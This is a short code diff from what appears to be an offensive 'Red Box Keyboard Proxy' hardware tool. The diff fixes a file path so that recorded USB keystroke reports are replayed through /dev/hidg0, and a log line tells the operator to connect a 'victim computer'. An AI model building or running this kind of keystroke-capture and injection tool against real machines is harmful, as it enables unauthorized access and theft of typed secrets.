@@ -439,7 +439,7 @@ Red Box Keyboard Proxy"""
         recorded_keys_path = "/var/tmp/keyboard_proxy_recorded_keys.txt"
         out.info(f"Reading raw USB reports from {recorded_keys_path} and repeating them as HID device!")
         out.info(f"Make sure your USB-C port is connected to a victim computer!")
-        keys = open(raw_logs,"rb")
+        keys = open(recorded_keys_path,"rb")
         with open('/dev/hidg0', 'rb+') as fd:
             while True:
                 key = keys.read(8)
